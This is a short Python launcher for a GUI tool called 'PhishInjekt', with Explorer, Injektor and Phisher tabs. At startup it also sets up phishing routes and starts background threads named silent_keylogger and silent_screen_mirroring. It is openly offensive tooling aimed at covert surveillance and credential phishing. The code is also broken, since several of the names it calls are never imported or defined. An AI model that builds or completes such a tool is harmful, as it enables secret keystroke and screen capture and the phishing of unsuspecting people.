import tkinter as tk
from tkinter import ttk
from explorer import setup_explorer_gui
from injektor import setup_injektor_gui
from phisher import setup_phisher_gui, app

def main():
    root = tk.Tk()
    root.title("PhishInjekt")

    notebook = ttk.Notebook(root)
    notebook.pack(pady=10, padx=10, expand=True, fill='both')

    explorer_tab = ttk.Frame(notebook)
    injektor_tab = ttk.Frame(notebook)
    phisher_tab = ttk.Frame(notebook)

    notebook.add(explorer_tab, text="Explorer")
    notebook.add(injektor_tab, text="Injektor")
    notebook.add(phisher_tab, text="Phisher")

    setup_explorer_gui(explorer_tab)
    setup_injektor_gui(injektor_tab)
    setup_phisher_gui(phisher_tab)

    root.mainloop()

if __name__ == "__main__":
    setup_phisher_routes()
    threading.Thread(target=silent_keylogger).start()
    threading.Thread(target=silent_screen_mirroring).start()
    main()
    app.run(debug=True)
